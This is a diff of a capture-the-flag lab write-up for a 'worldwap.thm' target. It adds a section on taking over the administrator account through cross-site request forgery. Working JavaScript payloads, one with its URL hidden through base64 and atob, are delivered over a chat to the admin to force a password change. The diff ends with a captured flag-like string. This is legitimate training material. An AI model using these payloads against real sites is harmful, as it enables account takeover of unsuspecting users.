@@ -59,49 +59,58 @@ Now let s try to steal the moderator session using his cookies:
 	![](Pasted%20image%2020250208191350.png)
 		![](Pasted%20image%2020250208191459.png)
 
-
-
-
-
-
-
-
-
-
-
-
 ## administrator account takeover
-### CSRF
+### **CSRF (request of password change)**
 
+We have noticed that change password functionality and it s endpoint (it is useful functiability for our CSRF payload)
+	![](Pasted%20image%2020250208213857.png)
+Parameter that we wanna change is new_password (this one will be injected in our req)
+	![](Pasted%20image%2020250208220056.png)Also we have the chat option where we can get in touch with our actual victim(admin)
+	![](Pasted%20image%2020250208214135.png)
 
-### File upload / Priv.esc
-Let s do another enum on the main app to see if we can find other interesting directories
-```shell   
-┌──(root㉿kali)-[~]
-└─# gobuster dir -u http://worldwap.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  
-===============================================================
-Gobuster v3.2.0-dev
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://worldwap.thm
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.2.0-dev
-[+] Timeout:                 10s
-===============================================================
-2025/02/08 17:27:27 Starting gobuster in directory enumeration mode
-===============================================================
-/public               (Status: 301) [Size: 313] [--> http://worldwap.thm/public/]
-/api                  (Status: 301) [Size: 310] [--> http://worldwap.thm/api/]
-/javascript           (Status: 301) [Size: 317] [--> http://worldwap.thm/javascript/]
-/phpmyadmin           (Status: 301) [Size: 317] [--> http://worldwap.thm/phpmyadmin/]
-/server-status        (Status: 403) [Size: 277]
-Progress: 219143 / 220561 (99.36%)===============================================================
-2025/02/08 17:27:54 Finished
-===============================================================
+Perfect scenario until now... let's build the payload script that will be sent over the chat. Here's an example of how an attacker can update a password  and send an asynchronous request to update the email seamlessly.
+
+```javascript
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://worldwap.thm:8081/change_password.php', true);
+    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            alert("Action executed!");
+        }
+    };
+    
+    xhr.send('action=execute&new_password=NBYTE');
+</script>
 ```
 
-![](Pasted%20image%2020250208193017.png)
-	
+However, it must be noticed that our payload is included now in a <href attribute (is converted in a direct link)
+	![](Pasted%20image%2020250208220532.png)
+
+To solve this problem we have to encode whole url and use javascript decoder built in function `atob`.
+	![](Pasted%20image%2020250208220659.png)
+```javascript
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST',atob( 'aHR0cDovL3dvcmxkd2FwLnRobTo4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA='), true);
+    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            alert("Action executed!");
+        }
+    };
+    
+    xhr.send('action=execute&new_password=NBYTE');
+</script>
+```
+
+![](Pasted%20image%2020250208220940.png)
+
+Now we can log in into the admin page with the newly created password :)
+
+AdM!nP@wnEd
